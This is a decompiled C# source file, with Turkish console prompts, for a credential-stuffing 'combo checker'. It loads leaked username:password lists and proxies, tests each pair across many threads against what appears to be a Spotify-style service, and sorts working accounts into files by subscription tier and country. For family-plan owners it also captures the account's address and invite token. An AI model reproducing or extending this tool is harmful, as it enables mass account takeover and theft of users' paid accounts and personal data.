using System;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Colorful;
using ikvm.extensions;
using Newtonsoft.Json.Linq;

namespace ConsoleApp1
{
	// Token: 0x02000007 RID: 7
	internal class CUI
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00002EA4 File Offset: 0x000010A4
		public static void Init()
		{
			Colorful.Console.Clear();
			Colorful.Console.WriteLine(Program.logo);
			Colorful.Console.WriteLine("");
			CUI.config = Module1.getConfig();
			for (;;)
			{
				try
				{
					Colorful.Console.WriteLine("Combo dosyasını aç: ");
					Thread.Sleep(200);
					Stats.combo = OpenFile.openFile("combo dosyası").ToList<string>();
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			Colorful.Console.WriteLine(Stats.combo.Count.ToString() + " combo dosyası yüklendi");
			if (!CUI.config.PROXYLESS)
			{
				if (!CUI.config.API)
				{
					Colorful.Console.WriteLine("Proxy dosyasını aç ");
					foreach (string text in OpenFile.openFile("proxy dosyası"))
					{
						if (text.Length > 7)
						{
							proxyObject item = new proxyObject(text.Trim(), true);
							Proxy.proxies.Add(item);
						}
					}
				}
				else
				{
					Proxy.updateList(new string[]
					{
						CUI.config.API_LINK
					});
					new Thread(new ParameterizedThreadStart(Proxy.updateThread)).Start(CUI.config.API_REFRESH_TIME * 60000);
				}
				Colorful.Console.WriteLine(Proxy.proxies.Count.ToString() + " proxiler yüklendi");
			}
			new Thread(new ThreadStart(CUI.ThreadStartingThread)).Start();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002259 File Offset: 0x00000459
		public static void ThreadStartingThread()
		{
			for (;;)
			{
				if (Stats.runningThreads < CUI.config.threads)
				{
					new Thread(new ThreadStart(CUI.thread)).Start();
					Stats.runningThreads++;
				}
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003014 File Offset: 0x00001214
		public static void thread()
		{
			proxyObject proxyObject = null;
			if (!CUI.config.PROXYLESS)
			{
				while (proxyObject == null)
				{
					proxyObject = Proxy.getProxy();
				}
			}
			string text = null;
			for (;;)
			{
				if (text == null)
				{
					text = getAcc.getacc();
				}
				try
				{
					CUI.SubType sub;
					if (!CUI.config.PROXYLESS)
					{
						sub = CUI.getSub(proxyObject.Proxy, text);
					}
					else
					{
						sub = CUI.getSub("null", text);
					}
					if (sub == CUI.SubType.ERROR)
					{
						Stats.ERROR++;
						if (!CUI.config.PROXYLESS)
						{
							proxyObject.Working = false;
							for (proxyObject = null; proxyObject == null; proxyObject = Proxy.getProxy())
							{
							}
						}
					}
					else
					{
						if (sub == CUI.SubType.FREE)
						{
							Stats.FREE++;
							CUI.save(Program.outFolder + "\\free.txt", text);
						}
						else if (sub == CUI.SubType.STUDENT)
						{
							Stats.STUDENT++;
							CUI.save(Program.outFolder + "\\student.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.DUO)
						{
							Stats.DUO++;
							CUI.save(Program.outFolder + "\\duo.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.FAMILYMEMBER)
						{
							Stats.FAMILY_MEMBER++;
							CUI.save(Program.outFolder + "\\family-member.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.FAMILYOWNER)
						{
							Stats.FAMILY_OWNER++;
							CUI.save(Program.outFolder + "\\family-owner.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.HULU)
						{
							Stats.HULU++;
							CUI.save(Program.outFolder + "\\hulu.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.PREMIUM)
						{
							Stats.PREMIUM++;
							CUI.save(Program.outFolder + "\\premium.txt", text);
							CUI.save(Program.outFolder + "\\allPremium.txt", text);
						}
						else if (sub == CUI.SubType.INVALID)
						{
							Stats.INVALID++;
							if (CUI.config.INVALIDS)
							{
								CUI.save(Program.outFolder + "\\invalid.txt", text);
							}
						}
						else if (sub == CUI.SubType.OTHER)
						{
							Stats.OTHER++;
							CUI.save(Program.outFolder + "\\other.txt", text);
						}
						text = null;
					}
					continue;
				}
				catch (NullReferenceException)
				{
					if (!CUI.config.PROXYLESS)
					{
						proxyObject.Working = false;
						proxyObject = Proxy.getProxy();
					}
					Stats.runningThreads--;
				}
				break;
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000032EC File Offset: 0x000014EC
		public static void save(string name, string input)
		{
			for (;;)
			{
				try
				{
					File.AppendAllText(name, input + "\n");
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003320 File Offset: 0x00001520
		public static CUI.SubType getSub(string proxy, string combo)
		{
			try
			{
				string @this = blala.check(proxy, combo);
				string text = @this.split("-lol-")[0].toLowerCase();
				CUI.SubType result;
				if (text.Contains("invalid"))
				{
					result = CUI.SubType.INVALID;
				}
				else if (text.Contains("error"))
				{
					result = CUI.SubType.ERROR;
				}
				else if (text.Contains("pr:open"))
				{
					result = CUI.SubType.FREE;
					CUI.save(Program.outFolder + "\\country\\free\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.Contains("student"))
				{
					result = CUI.SubType.STUDENT;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.Contains("hulu"))
				{
					result = CUI.SubType.HULU;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.contains("duo"))
				{
					result = CUI.SubType.DUO;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.contains("family") && text.contains("sub"))
				{
					result = CUI.SubType.FAMILYMEMBER;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.contains("family") && text.contains("master"))
				{
					result = CUI.SubType.FAMILYOWNER;
					string value = Regex.Match(@this.split("-lol-")[1], "(?<=canonical_username: \")(.*)(?=\")").Value;
					string value2 = Regex.Match(@this.split("-lol-")[1], "(?<=reusable_auth_credentials: \")(.*)(?=\")").Value;
					JObject jobject = JObject.Parse(puff.getCapture(value, value2, proxy));
					string text2 = jobject["address"].toString();
					string text3 = jobject["inviteToken"].toString();
					jobject["maxCapacity"].toString();
					int count = JArray.Parse(jobject["members"].toString()).Count;
					string text4 = JArray.Parse(jobject["members"].toString())[0]["country"].toString();
					Directory.CreateDirectory(Program.outFolder + "\\FamilyCapture");
					string str = string.Concat(new string[]
					{
						text2,
						":",
						text3,
						":",
						text4
					});
					File.AppendAllText(Program.outFolder + "\\FamilyCapture\\" + text4 + ".txt", str + "\n");
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else if (text.contains("pr:premium"))
				{
					result = CUI.SubType.PREMIUM;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				else
				{
					result = CUI.SubType.OTHER;
					CUI.save(Program.outFolder + "\\country\\premium\\" + @this.split("-lol-")[2] + ".txt", combo);
				}
				return result;
			}
			catch (Exception)
			{
			}
			return CUI.SubType.ERROR;
		}

		// Token: 0x0400000B RID: 11
		public static Config.configObject config;

		// Token: 0x02000008 RID: 8
		public enum SubType
		{
			// Token: 0x0400000D RID: 13
			FREE,
			// Token: 0x0400000E RID: 14
			PREMIUM,
			// Token: 0x0400000F RID: 15
			HULU,
			// Token: 0x04000010 RID: 16
			DUO,
			// Token: 0x04000011 RID: 17
			FAMILYMEMBER,
			// Token: 0x04000012 RID: 18
			FAMILYOWNER,
			// Token: 0x04000013 RID: 19
			OTHER,
			// Token: 0x04000014 RID: 20
			STUDENT,
			// Token: 0x04000015 RID: 21
			INVALID,
			// Token: 0x04000016 RID: 22
			ERROR
		}
	}
}
